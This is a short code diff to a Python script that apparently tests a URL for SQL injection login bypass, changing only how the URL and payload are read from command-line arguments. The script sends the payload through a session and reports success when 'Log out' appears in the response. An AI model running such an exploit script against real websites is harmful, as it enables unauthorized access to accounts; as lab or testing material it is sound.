@@ -33,16 +33,14 @@ def is_exploitable(url, payload, session):
         proxies=proxies).text
     return "Log out" in response
 
-def get_url_payload(arg1, arg2):
-    url = arg1.strip()
-    payload = arg2.strip()
+def get_url_payload():
+    url =sys.argv[1].strip()
+    payload = sys.argv[2].strip()
     return url, payload
 
 if __name__ == "__main__":
     try:
-        url, payload = get_url_payload(
-            sys.argv[1],
-            sys.argv[2])
+        url, payload = get_url_payload()
         session = requests.Session()
         if is_exploitable(url, payload, session):
             print("[+] SQL injection successful!")
